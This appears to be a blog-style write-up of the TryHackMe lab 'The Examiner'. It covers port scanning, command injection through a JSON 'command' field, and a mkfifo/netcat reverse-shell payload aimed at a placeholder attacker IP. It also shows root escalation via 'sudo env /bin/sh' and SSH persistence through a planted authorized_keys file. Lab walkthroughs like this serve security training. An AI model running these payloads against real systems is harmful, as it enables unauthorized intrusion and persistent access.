---
layout: default
Title: The Examiner
---

# THE EXAMINER !!!

![Screenshot_20220516_011333](https://user-images.githubusercontent.com/24994796/168499485-477468fd-c593-4fbb-ab07-51f6d9a1b077.png)

This led us to TryHackMe, I got excited xD 🤤

![Screenshot_20220516_014633](https://user-images.githubusercontent.com/24994796/168499573-68a4fb33-0a42-4147-9f2d-ef3d490f92e2.png)

THE EXAMINER !!!
Name sounded tough aye ? but it was pretty tricky yeah, 
Let's Jump Right Into it!!!

# ENUMERATION

First Things First We Enumerate
Let's know what port are open, what's running and all that
100% of all the time you enumeration is the key to pwning a machine

**Let's start with Nmap **
So I ran 3 scans
- A Quick Port (TCP) Scan
  -   ```nmap -sS -T4 --min-rate 5000 -Pn -oA quickie 10.10.185.57```
- A Quick UDP Scan
  -   ```nmap -sU -T4 --min-rate 5000 -Pn -oA udpquickie 10.10.185.57
- A Full Port Scan with Version Enumeration
  -   ```nmap -sVC -A -AO -T4 --min-rate 500 -p- -Pn -oA fullie 10.10.185.57```

![Screenshot_20220516_015241](https://user-images.githubusercontent.com/24994796/168500184-a52ff546-e25b-460f-834a-5025e04ef297.png)

So Yh Only A Single Port is Open and No UDP port Is Open


# Initial FOothold

So I Tried curl on it to see if the http server will return anything, also some services use port 5000 as default HTTP 
Returned Some Source code

![Screenshot_20220516_012408](https://user-images.githubusercontent.com/24994796/168501106-098afb91-7166-48d1-b01e-5b1a02899365.png)

So let's go to an actual browser and see what's up

![Screenshot_20220516_021424](https://user-images.githubusercontent.com/24994796/168500801-4bdfe7bd-83d5-469b-b017-c7278092c34b.png)

So yh Intercepting the request with burp (or zap) which ever you're comfortable with
![Screenshot_20220516_022624](https://user-images.githubusercontent.com/24994796/168501542-97cf1ef1-6d6c-4c8f-a9bd-a5bc49179f5e.png)
![Screenshot_20220516_022834](https://user-images.githubusercontent.com/24994796/168501553-fde3c3af-ef8a-4cd1-9a1a-3b8a21133efd.png)
![Screenshot_20220516_022950](https://user-images.githubusercontent.com/24994796/168501555-db6db8c9-1a63-43cb-9fb0-a6a90d1b5bfd.png)

When I tried an IP I got nothing, after lot's of trial and error
I got it to return me response

Found out the IP parameter takes two strings:then any thing and it tells you if the port is open or closed
But how does that help us ? Remember when we curl the site we got some Jscript and it said something about IP:Host and all

![Screenshot_20220516_012447](https://user-images.githubusercontent.com/24994796/168502041-bdec4db6-c8f5-4f44-ac63-a65f0c6d4487.png)

```curl -s 10.10.220.183:5000```

So as you can see below we can execute commands on the machine

![Screenshot_20220516_013414](https://user-images.githubusercontent.com/24994796/168502151-9b624b23-63fa-49fa-b34e-ee282dba5aae.png)

```$curl -X POST 10.10.220.183:5000/scan -H 'Content-Type: application/json' -d '{"ip":"aa:5000", "command": "whoami"}'```

Set up a listener (rlwrap makes stabilization easier)

```rlwrap nc -lvnp PORT```

```curl -X POST 10.10.220.183:5000/scan -H 'Content-Type: application/json' -d '{"ip":"aa:5000", "command": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc your-attacking-machine-ip 4242 >/tmp/f"}'```

![Screenshot_20220516_013457](https://user-images.githubusercontent.com/24994796/168502571-2a38b9a0-7e8c-4640-80c0-e21056267bec.png)

```/usr/bin/script -qc /bin/bash /dev/null```
To get tty and fully stabilize shell

# Privilege Escalation
**We get our shell, now let's escalate our privileges**

We got root via sudo privilege escalation method 

![Screenshot_20220516_013657](https://user-images.githubusercontent.com/24994796/168503111-c52bf07b-690b-431b-8ec5-bf25c1ba9a80.png)

```Sudo -l```
We see we can run env as root so head over to gtfobin look for env and use the command for privilege escalaion
```sudo env /bin/sh```

Yh we're in after enumerating for all txt file and checking every user home directory we find nothing
Viewing root user bash history we see some thing funny

![Screenshot_20220516_013732](https://user-images.githubusercontent.com/24994796/168503298-65ee9f3b-2cbc-4e8c-abe9-9cb5c7fc48ac.png)

Reading it showed us ther was a flag in sshuser but it was deleted, at this point I nearly snapped cos WTF!!!
I thought it was other users initially but on second thoughts I remembered THM resets the boxes and clears user modifications think of it like a rollback
The name sshuser also was sus actually and when reading the bash history I saw somethings bout ssh 

At this point, I went to the user ```su sshuser``` I'm root and root doesn't need your permission to switch to any user !!!

![Screenshot_20220516_031255](https://user-images.githubusercontent.com/24994796/168503897-e24b4da2-90af-4d45-9f40-0703e3c12db8.png)

![Screenshot_20220516_014035](https://user-images.githubusercontent.com/24994796/168504747-f103e5ef-6656-4b7d-ab63-3f5e5f365a1e.png)

So all that's left is to create authorized_keys in the newly generated .ssh folder 

```cd .ssh```

```cp id_rsa.pub authorized_keys```

```ss -tulnp``` To view listening ports, If we find one that's listening and it didn't turn up in our scan we can port forward to the port this technique is mostly used to beat firewall and docker breakout sometimes

A wiseman once said, "Hackers don't break in, We login"
```ssh -i id_rsa sshuser@localhost```
![Screenshot_20220516_014136](https://user-images.githubusercontent.com/24994796/168504880-85af0fbf-4429-423a-8ad4-b16eda5b5a39.png)

And We Done That's A Wrap !!!
![gif](https://media1.giphy.com/media/3knKct3fGqxhK/giphy.gif)


 Hit me up on [Twitter](https://twitter.com/abdulmalik_ttg) if anything Isn't clear



<br> <br>
[Back To Home](../../index.md)
<br>

  



